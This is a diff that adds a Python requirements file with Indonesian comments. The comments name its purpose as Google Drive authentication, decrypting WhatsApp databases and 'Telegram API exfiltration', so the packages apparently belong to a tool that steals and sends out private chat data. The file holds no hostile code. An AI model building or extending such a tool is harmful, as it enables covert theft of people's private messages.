@@ -1,0 +1,12 @@
+# Library Utama untuk Koneksi Google Drive & Auth
+gpsoauth
+
+# Library Enkripsi untuk Dekripsi Database WhatsApp
+pycryptodome
+
+# Library untuk API Telegram Exfiltration
+requests==2.23.0
+
+# Library Tambahan untuk Handling Data
+pytz
+six
